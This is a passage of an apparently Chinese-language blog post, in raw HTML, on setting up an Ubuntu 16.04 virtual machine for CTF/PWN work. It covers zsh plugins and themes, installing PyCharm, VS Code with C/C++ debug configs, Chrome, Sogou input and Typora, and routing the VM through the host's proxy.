variable">-eS</span> ~/.zsh_history_bad <span class="token operator">></span> ~/.zsh_history <span class="token operator">&amp;&amp;</span> fc <span class="token parameter variable">-R</span> ~/.zsh_history<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> ~/.zsh_history_bad<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>重启终端即可解决</p><ol start="2"><li>如果出现以下报错：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsh: no matches found: xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑 <code>~/.zshrc</code> 文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在文件最后加上一句：<code>setopt no_nomatch</code></p><p>使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="配置-zsh-autosuggestions"><a href="#配置-zsh-autosuggestions" class="headerlink" title="配置 zsh-autosuggestions"></a>配置 zsh-autosuggestions</h2><blockquote><p>这是一个历史命令智能提示插件，能帮助我们快速执行历史命令，实现终端历史命令自动补全</p></blockquote><p>通过 git 安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/oh-my-zsh/plugins<span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/zsh-users/zsh-autosuggestions.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>打开 <code>zsh</code> 配置文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>搜索 <code>plugins</code>，在 plugins 后面添加插件 <code>zsh-autosuggestions</code> （注意与原有的 git 空格隔开）</p><p>并加入插件 <code>zsh-autosuggestions</code> 的默认保存地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">plugins</span><span class="token operator">=</span><span class="token punctuation">(</span>git zsh-autosuggestions<span class="token punctuation">)</span><span class="token builtin class-name">source</span> /opt/oh-my-zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA11.png" alt="Ubuntu16.04虚拟机PWN环境搭建11.png"></p><p>保存退出后，更新 <code>~/.zshrc</code> 使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">➜  ~ <span class="token builtin class-name">source</span> ~/.zshrc<span class="token punctuation">[</span>oh-my-zsh<span class="token punctuation">]</span> plugin <span class="token string">'zsh-autosuggestions'</span> not found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这是因为前面并没有把插件的代码仓库克隆到本地位置上，所以插件其实并没有被安装</p><p>将插件克隆到本地：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新 <code>~/.zshrc</code> 使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>问题即可解决</p><p>安装 <code>zsh-autosuggestions</code> 前：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA18.png" alt="Linux虚拟机CTF环境搭建18.png"></p><p>安装 <code>zsh-autosuggestions</code> 后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA20.png" alt="Linux虚拟机CTF环境搭建20.png"></p><p>灰色部分就是终端历史命令自动补全，与 Kali 终端一样</p><hr><h2 id="配置-zsh-syntax-highlighting"><a href="#配置-zsh-syntax-highlighting" class="headerlink" title="配置 zsh-syntax-highlighting"></a>配置 zsh-syntax-highlighting</h2><blockquote><p>语法高亮插件，当在终端输入命令时，这个插件可以帮助纠错，命令为红色代表错误，绿色代表正确</p></blockquote><p>方法和配置 <code>zsh-autosuggestions</code> 一样</p><p>通过 git 安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/oh-my-zsh/plugins<span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/zsh-users/zsh-syntax-highlighting.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>打开 <code>zsh</code> 配置文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>搜索 <code>plugins</code>，在 plugins 后面添加插件 <code>zsh-syntax-highlighting</code> （空格隔开）</p><p>并加入插件 <code>zsh-syntax-highlighting</code> 的默认保存地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">plugins</span><span class="token operator">=</span><span class="token punctuation">(</span>git zsh-autosuggestions zsh-syntax-highlighting<span class="token punctuation">)</span><span class="token builtin class-name">source</span> /opt/oh-my-zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA12.png" alt="Ubuntu16.04虚拟机PWN环境搭建12.png"></p><p>将插件克隆到本地：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新 <code>~/.zshrc</code> 使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装 <code>zsh-syntax-highlighting</code> 后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA22.png" alt="Linux虚拟机CTF环境搭建22.png"></p><p>命令为绿色代表正确，红色代表输入错误</p><hr><h2 id="更换-ZSH-终端主题"><a href="#更换-ZSH-终端主题" class="headerlink" title="更换 ZSH 终端主题"></a>更换 ZSH 终端主题</h2><blockquote><p>zsh 终端自带很多不同风格的主题，可以根据自己的喜好更换</p></blockquote><p>查看 <code>zsh</code> 自带的主题：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/.oh-my-zsh/themes <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA24.png" alt="Linux虚拟机CTF环境搭建24.png"></p><p>打开 <code>zsh</code> 配置文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>搜索 <code>ZSH_THEME</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA23.png" alt="Linux虚拟机CTF环境搭建23.png"></p><p>默认主题是 <code>robbyrussell</code>，可以根据个人喜好自行修改</p><p>如果设置为：<code>ZSH_THEME=&quot;random&quot;</code>，则每次打开终端时，主题都是随机的</p><p>如果不知道选哪个主题好，也可以先将主题设置为随机，然后每次打开 <code>zsh</code> 后都会显示：<br><code>[oh-my-zsh] Random theme &#39;xxx&#39; loaded</code><br>其中 <code>xxx</code> 就是该主题的名字，遇到喜欢的，就将其加到 <code>ZSH_THEME</code> 中</p><p>修改好后，更新 <code>~/.zshrc</code> 使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以下主题样式可供参考：</p><ol><li><code>af-magic</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%981.png" alt="ZSH终端主题1.png"></p><ol start="2"><li><code>bira</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%982.png" alt="ZSH终端主题2.png"></p><ol start="3"><li><code>fox</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%983.png" alt="ZSH终端主题3.png"></p><ol start="4"><li><code>xiong-chiamiov</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%984.png" alt="ZSH终端主题4.png"></p><ol start="5"><li><code>gianu</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%985.png" alt="ZSH终端主题5.png"></p><blockquote><p>更多主题请查看：<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/themes#pygmalion">Themes · ohmyzsh&#x2F;ohmyzsh Wiki (github.com)</a></p></blockquote><hr><h2 id="切换-shell-终端"><a href="#切换-shell-终端" class="headerlink" title="切换 shell 终端"></a>切换 shell 终端</h2><p>查看系统已安装的 shell：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/shells<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前使用的 shell：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token environment constant">$SHELL</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>临时切换 shell：</li></ol><p>直接输入 shell 的名称即可，切换 zsh 就终端输入 zsh，切换 bash 就终端输入 bash</p><ol start="2"><li>永久切换 shell：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 将终端永久切换为 zsh</span><span class="token function">sudo</span> chsh <span class="token parameter variable">-s</span> /bin/zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h1 id="编辑器和-IDE"><a href="#编辑器和-IDE" class="headerlink" title="编辑器和 IDE"></a>编辑器和 IDE</h1><h2 id="安装-Pycharm-x2F-CLion"><a href="#安装-Pycharm-x2F-CLion" class="headerlink" title="安装 Pycharm&#x2F;CLion"></a>安装 Pycharm&#x2F;CLion</h2><blockquote><p>Ubuntu 16.04 的应用商店没有 Pycharm 和 CLion，只能自己通过安装包安装</p></blockquote><p>官网下载 Linux 版：<a href="https://www.jetbrains.com/pycharm/download/?section=linux">Download PyCharm: Python IDE for Professional Developers by JetBrains</a></p><p>以 pycharm-community-2021.3.3.tar.gz 为例（专业版同理）</p><p>解压并移动到 <code>/opt</code> 下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> pycharm-community-2021.3.3.tar.gz<span class="token function">sudo</span> <span class="token function">mv</span> pycharm-community-2021.3.3 /opt/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解压后进入 Pycharm 的 bin 目录，运行 Pycharm：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/pycharm-community-2021.3.3/bin<span class="token function">sudo</span> ./pycharm.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>运行软件后：<code>工具栏 –&gt; Tools –&gt; Create Desktop Entery</code> 可以创建桌面快捷方式，并将图标加入开始菜单</p><blockquote><p>如果不想用了，可以参照官方卸载方法：<a href="https://www.jetbrains.com/help/pycharm/uninstall.html">卸载 PyCharm | PyCharm 文档 (jetbrains.com)</a></p></blockquote><p>打开 Pycharm 后，如果界面显示异常，比如各种按键的方框显示不全：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA5.png" alt="Linux虚拟机CTF环境搭建5.png"></p><p><strong>一般虚拟机中的各种显示问题 bug，都和 VM 的 3D 图形加速有关</strong>，关掉即可正常显示：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA6.png" alt="Linux虚拟机CTF环境搭建6.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA7.png" alt="Linux虚拟机CTF环境搭建7.png"></p><hr><h2 id="安装-VScode"><a href="#安装-VScode" class="headerlink" title="安装 VScode"></a>安装 VScode</h2><blockquote><p>Ubuntu 16.04 的应用商店没有 VScode，只能自己通过安装包安装</p></blockquote><p>下载软件包：<a href="https://packages.microsoft.com/repos/vscode/pool/main/c/code/">Microsoft VScode</a></p><p>安装，以 code_1.74.2-1671533413_amd64.deb 为例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> code_1.74.2-1671533413_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装好后，如果 Ubuntu 16.04 设置了代理，在 VScode 中扩展会无法访问：<code>XHR failed</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA3.png" alt="Ubuntu16.04虚拟机PWN环境搭建3.png"></p><p>其实是整个 VScode 都无法连接网络，也无法登录账户同步</p><p>解决办法：</p><p>在 VScode 的设置中搜索 <code>proxy</code> （代理），找到 <code>Http：Proxy</code> 这一项</p><p>在 <code>Http：Proxy</code> 中填入 HTTP 代理的 IP 地址和端口号：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA5.png" alt="Ubuntu16.04虚拟机PWN环境搭建5.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA4.png" alt="Ubuntu16.04虚拟机PWN环境搭建4.png"></p><p>刷新一下扩展，扩展访问正常</p><p>如果不使用代理，则同时关闭 Ubuntu 和 VScode 的代理设置</p><hr><h3 id="配置-C-x2F-C"><a href="#配置-C-x2F-C" class="headerlink" title="配置 C&#x2F;C++"></a>配置 C&#x2F;C++</h3><blockquote><p>首先要安装好 <code>gcc</code>、<code>g++</code>、<code>gdb</code> 环境</p></blockquote><p>安装 <code>C/C++</code> 和 <code>Code Runner</code> 插件</p><p>使用 VScode 调试：<br>新建 <code>.vscode</code> 文件夹，在 <code>.vscode</code> 文件夹下新建两个文件：<code>launch.json</code> 和 <code>tasks.json</code></p><p><strong>以后在其他的文件夹中要调试都要重建 <code>.vscode</code> 子文件夹并配置</strong></p><ul><li><code>launch.json</code> 内容：</li></ul><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.2.0"</span><span class="token punctuation">,</span>    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"C/C++"</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"cppdbg"</span><span class="token punctuation">,</span>            <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"launch"</span><span class="token punctuation">,</span>            <span class="token property">"program"</span><span class="token operator">:</span> <span class="token string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;"</span><span class="token punctuation">,</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"stopAtEntry"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"$&#123;workspaceFolder&#125;"</span><span class="token punctuation">,</span>            <span class="token property">"environment"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"externalConsole"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"MIMode"</span><span class="token operator">:</span> <span class="token string">"gdb"</span><span class="token punctuation">,</span>            <span class="token property">"preLaunchTask"</span><span class="token operator">:</span> <span class="token string">"compile"</span><span class="token punctuation">,</span>            <span class="token property">"setupCommands"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                    <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Enable pretty-printing for gdb"</span><span class="token punctuation">,</span>                    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"-enable-pretty-printing"</span><span class="token punctuation">,</span>                    <span class="token property">"ignoreFailures"</span><span class="token operator">:</span> <span class="token boolean">true</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>tasks.json</code> 内容：</li></ul><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"2.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"tasks"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>            <span class="token property">"label"</span><span class="token operator">:</span> <span class="token string">"compile"</span><span class="token punctuation">,</span>            <span class="token property">"command"</span><span class="token operator">:</span> <span class="token string">"g++"</span><span class="token punctuation">,</span>   <span class="token comment">// c 文件为 gcc, cpp 文件为 g++</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"-g"</span><span class="token punctuation">,</span>                <span class="token string">"$&#123;file&#125;"</span><span class="token punctuation">,</span>                <span class="token string">"-o"</span><span class="token punctuation">,</span>                <span class="token string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;"</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"problemMatcher"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"owner"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>                <span class="token property">"fileLocation"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                    <span class="token string">"relative"</span><span class="token punctuation">,</span>                    <span class="token string">"$&#123;workspaceRoot&#125;"</span>                <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token property">"pattern"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"regexp"</span><span class="token operator">:</span> <span class="token string">"^(.*):(\\d+):(\\d+):\\s+(warning|error):\\s+(.*)$"</span><span class="token punctuation">,</span>                    <span class="token property">"file"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>                    <span class="token property">"line"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>                    <span class="token property">"column"</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>                    <span class="token property">"severity"</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>                    <span class="token property">"message"</span><span class="token operator">:</span> <span class="token number">5</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"group"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"build"</span><span class="token punctuation">,</span>                <span class="token property">"isDefault"</span><span class="token operator">:</span> <span class="token boolean">true</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="配置-Python"><a href="#配置-Python" class="headerlink" title="配置 Python"></a>配置 Python</h3><blockquote><p>首先要安装好 <code>python</code> 环境</p></blockquote><p>安装插件 <code>Code Runner</code> 即可，其他插件：<code>Pylance</code>、<code>Python</code></p><p><code>Code Runner</code> 插件的代码运行指令可在 <code>扩展 -&gt; Code Runner -&gt; 扩展设置 -&gt; Code-runner: Executor Map -&gt; 在 settings.json 中编辑</code> 进行自定义</p><hr><h3 id="使用和一些问题"><a href="#使用和一些问题" class="headerlink" title="使用和一些问题"></a>使用和一些问题</h3><blockquote><p>如果是从 snap 商店安装的 VScode 可以直接使用，如果是自己通过 .deb 包安装，可能需要将 code 添加到环境变量</p></blockquote><p>从终端打开 VScode：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">code<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 VScode 创建文件并编辑： （类似于 VIM）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">code 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意：<br><strong>在 VScode 中使用绝对路径一般没问题，但是使用相对路径 <code>./</code> 可能会出问题</strong><br>这并不是路径错了，而是 <em>VScode 默认的相对路径是针对 <code>.vscode</code> 文件夹所在的目录，而不是当前编辑的文件所在目录</em><br><em><code>.vscode</code> 文件夹默认放置在用户家目录下：<code>~/</code></em></p></blockquote><p>解决办法：</p><ul><li>打开 VScode 设置，在 <code>Code Runner</code> 插件中搜索：<code>File Directory As Cwd</code>，将下面的选项打上勾，重新打开编辑的文件，即可正常</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA2.png" alt="Linux虚拟机CTF环境搭建2.png"></p><ul><li>如果不使用 <code>Code Runner</code>，而是直接使用 <code>Python</code> 插件，则在 <code>Python</code> 插件中搜索：<code>Execute ln File Dir</code>，将下面的选项打上勾，重新打开编辑的文件，即可正常</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA4.png" alt="Linux虚拟机CTF环境搭建4.png"></p><hr><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="安装-Chrome-浏览器"><a href="#安装-Chrome-浏览器" class="headerlink" title="安装 Chrome 浏览器"></a>安装 Chrome 浏览器</h2><blockquote><p>众所周知，“Chrome 是世界上最好的浏览器” （手动狗头）</p></blockquote><p>由于最新版的 Chrome 已经不支持 Ubuntu 16.04 了，因此需要自己下载旧版本的 deb 包进行安装</p><p>下载地址：<a href="https://www.chromedownloads.net/chrome64linux/">Chrome Downloads</a></p><p>下载后解压，直接安装 deb 包即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> google-chrome-stable_current_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果安装报错，说明版本不合适，请选择其他更旧的版本</p><p>推荐版本：<a href="https://www.chromedownloads.net/chrome64linux-stable/1266.html" title="chrome_linux64_stable_101.0.4951.54">chrome_linux64_stable_101.0.4951.54</a></p><hr><h2 id="安装搜狗输入法"><a href="#安装搜狗输入法" class="headerlink" title="安装搜狗输入法"></a>安装搜狗输入法</h2><p>下载 Linux 版搜狗输入法：<a href="http://cdn2.ime.sogou.com/dl/index/1571302197/sogoupinyin_2.3.1.0112_amd64.deb?st=EDsKarP7mjX2oPmtqBOCJA&e=1589200310&fn=sogoupinyin_2.3.1.0112_amd64.deb">sogoupinyin_2.3.1.0112_amd64.deb</a></p><p>以参考安装步骤中的 <code>sogoupinyin_2.3.1.0112_amd64.deb</code> 版本为主，使用太新的版本会导致 Ubuntu 重启后无法进入桌面</p><p>参考安装步骤：<a href="https://blog.csdn.net/weixin_44205779/article/details/107464267">【Ubuntu】Ubuntu16.04安装 搜狗输入法 史上最详细_ubuntu 16.04 安装搜狗输入法-CSDN博客</a></p><hr><h2 id="安装-Typora"><a href="#安装-Typora" class="headerlink" title="安装 Typora"></a>安装 Typora</h2><p>查看电脑架构：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-m</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载对应的 Typora 安装包：</p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># x86(amd64)</span><span class="token function">wget</span> https://download2.typoraio.cn/linux/typora_1.6.6_amd64.deb --output-document typora.deb  <span class="token comment"># ARM</span><span class="token function">wget</span> https://download2.typoraio.cn/linux/typora_1.6.6_arm64.deb --output-document typora.deb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  安装 Typora：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> typora.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="虚拟机代理"><a href="#虚拟机代理" class="headerlink" title="虚拟机代理"></a>虚拟机代理</h2><blockquote><p><strong>这里针对 Ubuntu 16.04 主要介绍虚拟机走主机代理的方法，也是比较推荐这种方法，因为简单方便</strong></p><p>如果想在 Ubuntu 16.04 安装 clash 请参考《Ubuntu22.04虚拟机PWN环境搭建》 （可能需要注意版本问题）</p></blockquote><p>将虚拟机网络模式设置为 NAT 或桥接模式 （两种方式物理机 IP 地址不一样，NAT 模式虚拟机走物理机的 VMnet8 虚拟网卡，桥接模式走物理机的 VMnet0 网卡）</p><p>这里以 NAT 模式为例，假设物理机 IP 为 192.168.148.1</p><hr><h3 id="通过-clash-走代理"><a href="#通过-clash-走代理" class="headerlink" title="通过 clash 走代理"></a>通过 clash 走代理</h3><p>物理机在 clash 主界面中打开“局域网代理”（Allow LAN），并查看代理端口，以 7890 为例</p><p>在虚拟机中按参数手动设置代理即可：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA12.png" alt="Linux虚拟机CTF环境搭建12.png"></p><hr><h3 id="通过-v2rayN-走代理"><a href="#通过-v2rayN-走代理" class="headerlink" title="通过 v2rayN 走代理"></a>通过 v2rayN 走代理</h3><p>物理机在 v2rayN 中打开：<code>设置 -&gt; 参数设置 -&gt; 允许来自局域网的连接</code></p><p>在 v2rayN 主界面中，查看局域网的 socks5 和 http 端口号：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA10.png" 